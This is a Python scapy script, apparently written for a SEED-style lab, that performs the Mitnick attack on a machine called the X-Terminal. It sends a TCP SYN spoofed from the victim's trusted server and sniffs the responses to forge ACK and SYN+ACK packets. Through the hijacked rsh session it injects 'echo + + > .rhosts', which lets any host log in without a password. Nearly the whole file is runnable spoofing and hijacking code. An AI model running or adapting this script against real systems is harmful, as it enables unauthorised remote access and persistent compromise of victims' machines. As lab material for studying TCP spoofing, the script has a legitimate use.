#!usr/bin/python3

from scapy.all import*

x_ip = "192.168.12.5" #X-Terminal 
x_port = 514 #Port number used by X-Terminal
x_port1=1023
srv_ip = "192.168.12.6" #The trusted server 
srv_port = 1023 #Port number used by the trusted server 
srv_port1= 9090
def spoof_pkt(pkt):
	Seq=123456789 + 1 #The sequence number is always in increment of 1
	old_ip=pkt[IP]
	old_tcp=pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
	print ("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))


	#send spoofed ACK packet when SYN ACK packet is detected
	if old_tcp.flags=="SA": #if old flag is SYN ACK then send a spoofed ack packet
		print("sending spoofed ACK packet to the X-Terminal (Victim)")
		ip=IP(src=srv_ip,dst=x_ip) #sending ack 
		tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

	# Sending spoofed RSH data packet after sending ACK packet to X-terminal
		print("Sending Spoofed RSH Data Packet to the X-Terminal(victim)")
		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00' #echo + + will replace the previous trusted server ip address and wouldn't authenticate anyone RSH connnection to the server. 
		pkt = ip/tcp/data
		send(pkt,verbose=0)
	       
	if old_tcp.flags=='S' and old_tcp.dport == srv_port1 and old_ip.dst == srv_ip:
		Seqence=123456788
		print("sending spoofed SYN+ACK packet to the X-Terminal (Victim)")
		ip=IP(src=srv_ip,dst=x_ip)
		tcp=TCP(sport=srv_port1, dport=x_port1, flags="SA", seq=Seqence, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

# This is the first function which will be exucted when the main function is executed. It sends a Spoofed SYN packet to the X-terminal inacting as trusted server. 
def spoofing_SYNPacket():
	print("Sending Spoofed SYN packet to X-terminal (victim)")
	ip = IP(src="192.168.12.6", dst="192.168.12.5") #src is trusted server and dst is victim
	tcp = TCP(sport=1023,dport=514,flags="S", seq=123456789)
	pkt = ip/tcp
	send(pkt,verbose=0)


def main():
	spoofing_SYNPacket()
	pkt=sniff(filter="tcp and src host 192.168.12.5", prn=spoof_pkt) 

if __name__ == "__main__":
	main()

	
